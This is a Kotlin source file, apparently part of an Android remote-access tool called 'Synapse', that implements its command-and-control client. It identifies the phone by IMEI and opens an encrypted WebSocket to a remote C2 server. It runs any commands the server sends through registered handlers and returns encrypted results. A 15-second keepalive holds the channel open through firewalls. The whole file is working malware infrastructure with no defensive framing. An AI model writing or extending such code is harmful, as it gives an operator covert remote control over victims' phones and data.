package org.synapse.core.c2

import android.content.Context
import android.util.Log
import org.synapse.core.core.CryptoEngine
import org.synapse.core.core.SynapseResponse
import kotlinx.coroutines.*
import kotlinx.serialization.json.Json

object C2Coordinator {
    private const val TAG = "Synapse.C2"
    private const val KEEPALIVE_INTERVAL_MS = 15_000L  // 15 second application-level ping

    private var ws: WebSocketTransport? = null
    private var fcmToken: String? = null
    private var c2BaseUrl: String = ""
    private var scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var deviceId: String = ""
    private var keepaliveJob: Job? = null

    fun start(
        context: Context,
        imei: String,
        serverUrl: String,
        token: String?,
        handlers: Map<String, suspend (Command) -> SynapseResponse>
    ) {
        deviceId = imei
        fcmToken = token
        c2BaseUrl = serverUrl

        CommandDispatcher.register(handlers)
        CommandDispatcher.setDeviceId(imei)

        ws = WebSocketTransport(
            serverUrl = serverUrl,
            onCommand = { cmd ->
                // Dispatch synchronously with timeout to avoid blocking WS thread forever
                kotlinx.coroutines.runBlocking {
                    val deferred = scope.async {
                        CommandDispatcher.dispatch(
                            Json { ignoreUnknownKeys = true }
                                .encodeToString(Command.serializer(), cmd)
                        )
                    }
                    val result = kotlinx.coroutines.withTimeoutOrNull(25_000) {
                        deferred.await()
                    } ?: "{\\\"type\\\":\\\"ErrorResponse\\\",\\\"error\\\":\\\"dispatch_timeout\\\"}"
                    CryptoEngine.encrypt(result)
                }
            },
            onStatus = { status -> Log.d(TAG, "WS: $status") }
        ).also { it.connect(imei) }

        // ── Application-level keepalive: send ping every 15 seconds ──
        startKeepalive()
    }

    fun stop() {
        keepaliveJob?.cancel()
        scope.cancel()
        ws?.disconnect()
    }

    fun updateFcmToken(token: String) {
        fcmToken = token
    }

    fun sendResult(payload: String) {
        ws?.send(CryptoEngine.encrypt(payload))
    }

    fun isConnected(): Boolean = ws?.isConnected() == true

    /**
     * Application-level keepalive: sends a lightweight "ping" command
     * every KEEPALIVE_INTERVAL_MS. This keeps the WebSocket connection
     * alive even when the server's TCP idle timeout is short, and also
     * serves as a heartbeat to detect disconnections early.
     *
     * The ping uses `CryptoEngine.encrypt()` so the server sees a normal
     * encrypted message — it can respond or ignore it. The key point is
     * that data flows on the connection, preventing NAT/firewall timeouts.
     */
    private fun startKeepalive() {
        keepaliveJob?.cancel()
        keepaliveJob = scope.launch {
            delay(5_000) // Initial delay to let registration complete
            while (isActive) {
                try {
                    if (ws?.isConnected() == true) {
                        val pingJson = """{"type":"result","device_id":"$deviceId","command_id":"keepalive","data":"pong"}"""
                        ws?.send(CryptoEngine.encrypt(pingJson))
                        Log.d(TAG, "Keepalive ping sent")
                    } else {
                        Log.d(TAG, "Keepalive skipped — not connected")
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Keepalive ping failed: ${e.message}")
                }
                delay(KEEPALIVE_INTERVAL_MS)
            }
        }
        Log.d(TAG, "Keepalive started (interval=${KEEPALIVE_INTERVAL_MS}ms)")
    }
}
